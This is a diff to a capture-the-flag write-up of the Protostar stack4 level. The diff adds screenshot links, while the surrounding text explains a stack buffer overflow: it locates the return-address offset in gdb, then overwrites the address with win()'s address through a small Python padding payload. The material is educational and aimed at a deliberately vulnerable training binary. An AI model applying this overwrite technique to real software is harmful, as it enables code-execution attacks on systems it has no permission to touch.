@@ -44,11 +44,13 @@ We can change the return pointer to point to win() function, this executing it a
 
 ##### Disassembly:
 
+![disassembly](https://github.com/noobfromPitt/Protostar-writeups/blob/master/stack4/disassemble.PNG)
 
 Lets start by running ./stack4 with a large input (AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ) since we dont know where the return pointer is
 
 create breakpoint at ret `break *0x0804841e` and run
 
+![ret-1](https://github.com/noobfromPitt/Protostar-writeups/blob/master/stack4/ret-1.PNG)
 
 We can see that $esp (0xbffff75c) is loaded with 0x56565656 and the next step after ret tried to execute 0x56565656 and failed.
 
@@ -66,9 +68,6 @@ padding = "AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSST
 padding += "\xf4\x83\x04\x08" #address 0x80483f4
 print padding
 ```
-
+![done](https://github.com/noobfromPitt/Protostar-writeups/blob/master/stack4/done.PNG)
 
 Now we can see that $esp now has 0x080483f4 and win() is executed
-
-
-
